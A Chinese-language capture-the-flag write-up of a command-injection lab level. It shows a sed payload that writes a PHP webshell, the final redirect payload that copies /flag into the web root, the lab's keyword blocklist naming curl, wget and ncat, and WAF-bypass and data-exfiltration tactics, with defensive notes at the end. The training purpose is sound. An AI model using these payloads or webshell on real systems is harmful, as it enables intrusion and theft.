RCE-Labs Level 27 - sed 篡改/写入 Webshell 与重定向进阶

2026年10月5日 RCE-Labs Webshell 网络基础 护网认知

一、题目信息

  • 1.题目名称：RCE-Labs Level 27 (sed 篡改/写入 Webshell)
  • 2.题目平台：RCE-Labs 靶场 (灵境平台部署)
  • 3.题目类型：Web安全 / 远程代码执行 (RCE) / 文件写入 / WAF 绕过
  • 4.靶场链接：http://靶机IP:8080/less-27/
  • 5.涉及工具：浏览器、Burp Suite

二、解题步骤

1. 分析题目考什么

题目提示“利用 sed 命令的特性，替换文件内容写入 Webshell”。这一关引入了“写 Webshell”的概念。核心考点是：面对浏览器转义和 WAF 敏感词拦截，如何利用 sed 的原地修改特性，或者退而求其次利用重定向符，实现数据外带。

2. 怎么想（破题思路与踩坑记录）

踩坑记录一：浏览器乱转义导致 404

尝试 Payload：?cmd=sed -i '1i <?php system($_GET["cmd"]);?>' 1.php

失败响应：访问 1.php 报 404 Not Found。

原因分析：浏览器地址栏是一个“自作聪明的翻译官”。看到 <、>、?、& 等符号，它会擅自截断或转义，导致命令残缺不全，文件根本没写进去。

改进方式：放弃浏览器，改用 Burp Suite 发送原始包并手动进行 URL 编码，或者直接用重定向写入静态文件。

踩坑记录二：WAF 拦截写 Webshell

尝试 Payload：通过 Burp 发送全编码的写马 Payload。

失败响应：仍然 404，或者被 WAF 静默拦截。

原因分析：WAF 部署在 Web 服务器前面，它会检查 HTTP 请求的内容。如果包含 <?php、system 等敏感词，会被直接丢弃。

改进方式：放弃写 Webshell，利用重定向符 > 直接写入静态文本文件，绕过 WAF 的敏感词检测。

3. 怎么解（详细步骤与逐字翻译）

源码核心逻辑

$pattern = '/cat|tac|head|tail|more|less|nl|sort|uniq|od|xxd|hexdump|base32|base64|strings|grep|file|find|cp|mv|ping|curl|echo|wget|ncat/';
if(!preg_match($pattern,$cmd)){
    system($cmd);
}

最终成功 Payload：重定向写入 Web 目录

既然写 Webshell 被 WAF 拦截，我们利用未被拦截的 sed 和重定向符 > 直接读取 Flag 并写入 Web 目录：

?cmd=sed -n '1,10p' /flag > 27.txt

命令逐字解析：

  • sed：流编辑器。
  • -n：抑制默认输出，不把每一行都打印出来。
  • '1,10p'：打印第 1 到第 10 行。p 是 print 的意思。
  • /flag：要操作的目标文件。
  • >：Shell 重定向符，将标准输出写入 27.txt。
  • 27.txt：目标文件名，位于 Web 根目录下。

第二步：访问文件

访问 http://靶机IP:8080/less-27/27.txt，成功回显明文 flag{TEST_Dynamic_FLAG}。

4. 怎么迁移（跨学科与跨领域联想）

  • 真实渗透中的数据外带：在护网行动中，如果写 Webshell 被拦截，红队通常会通过重定向写入日志文件、SQL 文件，或者利用 DNS/ICMP 隧道外带数据。
  • 文件备份与日志记录：在系统运维中，脚本经常利用 > 和 >> 将程序输出写入日志文件，例如 nohup python server.py > server.log 2>&1 &，这是自动化运维的基础。

三、名词大全与原理深度复盘

1. sed 命令深度详解

sed（Stream Editor，流编辑器）是 Linux 三剑客之一，擅长对文本进行“查找、替换、插入、删除”。

  • 替换命令 s：sed 's/旧内容/新内容/g' 文件名。g 表示全局替换。例如 sed 's/admin/root/g' passwd。
  • 原地修改 -i：默认情况下 sed 只把修改结果打印到屏幕，不加 -i 无法修改原文件。加上 -i 才能真正改写并保存。这正是题目提示“篡改”的用意。
  • 插入命令 i：sed -i '1i 内容' 文件名，在第 1 行前插入内容。

2. 重定向符 `>` 的底层逻辑

在 Linux 系统中，每个进程都有三个默认的文件描述符：标准输入（0）、标准输出（1）、标准错误（2）。> 是 Shell 的一种语法糖，它会在执行命令前，调用内核的 dup2() 系统调用，将标准输出（fd=1）指向一个新的文件。这样命令产生的所有输出都会直接写入文件，而不是打印到屏幕上。WAF 往往只检测命令名称，而忽略重定向符，这就是绕过成功的根本原因。

3. Webshell 与 404 排错逻辑

什么是 Webshell？Webshell 是一个恶意脚本（如 PHP），例如 <?php system($_GET['cmd']); ?>。写进去后，可以通过浏览器传参执行任意命令。

遇到 404 Not Found 怎么排错？

  • 文件真的存在吗？用 ls -la 1.php 看一下。不存在，说明 sed -i 没写成功（可能是权限不够，或者浏览器把命令转义坏了）。
  • 权限够吗？Web 服务器通常以 www-data 用户运行，它只能写自己有权限的目录。用 id 看当前用户，用 ls -ld /var/www/html/less-27 看目录权限。
  • 被 WAF 拦了吗？如果 ls 看不到文件，但也没有报错，大概率是 WAF 把包含 <?php 的请求直接静默丢掉了。

4. 防火墙与 WAF 的区别

  • 防火墙（Firewall）：工作在网络层和传输层，主要负责控制 IP 和端口的进出。它会拦截非标准端口的 TCP 连接（如 9002），这就是反弹 Shell 容易失败的原因。
  • WAF（Web 应用防火墙）：工作在应用层，专门检查 HTTP 请求的内容。它维护一个黑名单字典，包含 <?php、system 等敏感词。写 Webshell 时如果包含这些词，就会被 WAF 拦截。

5. 核心网络基础与护网认知（陌生人也能看懂版）

  • 外网（公网/互联网）：拥有全球唯一的门牌号（公网 IP，如 8.8.8.8），任何人任何车都能开到你家门口。
  • 内网（局域网）：门牌号是“小区内部编号”（如 192.168.1.19），只有小区内部的人才能互相找到。外面的人想找你，必须经过小区保安（路由器/NAT）允许并做地址转换。
  • 完全隔离的内网：小区不仅不让外面的人进，甚至把大门用砖头砌死了（物理隔离）。这种环境下，反弹 Shell 和重定向写入 100% 都会失效。
  • HTTP 是公网吗？这是一个经典的误解！HTTP 不是网络，它是语言（协议）。就像“普通话”不是某个地方，而是一种交流方式。无论你是在访问内网的 OA 系统（http://192.168.1.100），还是访问百度官网（http://baidu.com），都是在用 HTTP 这个“语言”说话。所以，HTTP 既可以跑在内网，也可以跑在外网。
  • 操作系统与网络的关系：电脑操作系统是管理网络硬件的“交通警察”。你的网卡是公路，操作系统负责定义 IP 地址、网关，并内置防火墙（如 iptables）。当你监听 80 端口成功、9002 端口失败时，根本原因就是操作系统或 Docker 的虚拟网卡策略，只放行了 80 端口的出站，拦截了 9002 端口。
  • 护网是在攻击内网吗？简单来说，护网是一场“攻城战”：第一阶段是“外网打点”（攻打城门），寻找对外门户的漏洞；第二阶段是“内网渗透”（巷战与横向移动），拿下边界服务器后，以它为跳板，在内网里提权、抓密码、扫描其他机器；第三阶段是“拿下靶标”（直捣黄龙），控制核心数据库或域控。所以，内网渗透绝对是护网中最核心、最残酷、决定胜负的主战场。

四、题目思考

1. 这跟前面关卡的区别

前面关卡（Level 21-26）主要尝试了 DNSLog 外带和反弹 Shell，受限于 Docker 网络和 WAF。Level 27 正式引入了“写 Webshell”的概念，但由于 WAF 拦截，我们最终回归到了最稳妥的“重定向写入”方案。这体现了渗透测试中“条条大路通罗马”的核心思想。

2. 这种题目的出现原因（底层逻辑与历史原因）

在真实网络架构中，防火墙和 WAF 会严格限制出站流量和敏感关键字。这迫使攻击者必须掌握多种数据外带方式，以适应不同的网络环境。重定向写入之所以能成为“保底”方案，是因为 Web 服务器天生就是用来提供静态文件访问的，写入一个普通的 .txt 文件很难被安全设备识别为恶意行为。

3. 这种漏洞在实际中的应用

在护网和红队行动中，当常规的 C2 通道被拦截时，红队会转而使用 DNS 隧道、ICMP 隧道或 HTTPS 伪装等方式外带数据。学会“写入 Web 目录”则是基础中的基础，也是最稳定的战果保障。

4. 如何抽象理解概念（大白话）

把读取文件比作“考试传递答案”。Level 25 是你试图在考场里用手机发短信（反弹 Shell），但监考老师没收了手机（网络限制）。Level 26 是你又试图用对讲机（ncat），但被屏蔽器（WAF）干扰了。最后你发现，直接把答案写在纸条上（写入文件）扔到窗外，是最稳妥的作弊方式（通过 HTTP 访问）。而外网和内网的关系，就像你在考场里（内网）传纸条，和你在校外（外网）想直接打电话给考场里的同学。防火墙就是学校的围墙和保安。HTTP 就是你们约定好使用的普通话暗号。

5. 他的本质

本质是利用 Web 服务器的静态资源访问特性，将命令执行结果从“应用层回显”转移到“文件系统持久化”，从而绕过 WAF 对输出内容的过滤和限制。

6. 如果我是出题人或者攻击者我会怎么防守或者破解

  • 防守方（蓝队）：严格限制 Web 进程的文件系统权限，确保 Web 用户无法写入 Web 根目录。部署 WAF 时，不仅要拦截命令关键字，还要检测重定向符 >、tee 等文件写入操作。同时，监控 Web 目录下是否存在异常的文本文件生成。
  • 破解方（红队）：如果 > 被拦截，可以尝试使用 tee 命令（既回显又写文件）、cp /flag /var/www/html/1.txt 或 mv 命令。如果写文件也被拦截，可以尝试基于时间的盲注（Time-based），或者利用 DNS 隧道/ICMP 隧道等更隐蔽的外带通道。
